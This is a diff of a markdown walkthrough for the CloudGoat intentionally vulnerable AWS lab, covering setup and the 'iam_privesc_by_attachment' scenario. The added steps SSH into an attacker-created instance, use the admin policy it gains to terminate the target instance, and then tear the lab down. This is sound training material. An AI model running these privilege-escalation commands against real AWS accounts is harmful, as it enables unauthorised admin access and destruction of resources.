@@ -22,7 +22,7 @@ This covers debian based distros
 Your linux distro should already have Python3, but you can verify it is installed from terminal  
 1. Verify python3.6+ is installed
 `python3` will launch the installed version of python 3 which it will list on the 1st line  
-CTRL+D to quit  
+_CTRL+D_ to quit  
 2. Install terraform 
 `sudo snap install terraform`
 3. Verify terraform installation 
@@ -45,7 +45,7 @@ CTRL+D to quit
 5. Change the directory to a good location for CloudGoat *~/* seems to work best for a least priv option  
 
 
-### Cloudgoat 
+### Cloudgoat Installation
 1. Install CloudGoat  
 ```bash
 git clone https://github.com/RhinoSecurityLabs/cloudgoat.git
@@ -155,16 +155,25 @@ Further inspection if the Group Names are to be believed, one is for http, and t
 `aws ec2 describe-instances --instance-id <newInstanceID> --profile kerrigan`
 16. SSH into the newly created instance
 `ssh -i mighty.pem ubuntu@<publicDNSnameValue>`
-17. 
-Attach full admin instance profile to EC2 instance
-1. Access new EC2 instance and execute aws cli commands with full admin privileges
-15.
-
+17. Install AWS CLI
+`sudo apt-get update && apt install awscli`
+18. Look at the permissions of the mighty policy
+`aws iam get-policy-version --policy-arn <mightArn> --version-id v1`
+Now that the new instance contains full admin access the targe instance can be terminated from it
+19. `aws ec2 terminate-instances --instance-ids <targetInstanceID> --region us-east-1`   
+**Goal Achieved**
 
 ### Remove iam_privesc_by_attachment
-1. Delete all created resources as these will not be removed with CloudGoat's Destroy script
-
-2. Remove the 
+1. Exit the newly created instance
+2. Log into the aws management console site and navigating to Services > EC2
+3. Select Running Instances 
+4. Check the box beside the running image
+5. Select Actions > Instances State > Terminate
+6. Click **Yes, Terminate** when the warning that all data will be lost on the instance pops up
+7. Click Key Pairs on the left of the screen
+8. Ensure the checkbox for the mighty key pair is checked and click Delete
+9. Remove the scenario with cloudgoat
+`cloudgoat.py destroy iam_privesc_by_attachment --profile goat`
 
 ## cloud_breach_s3
 1. Create scenario  
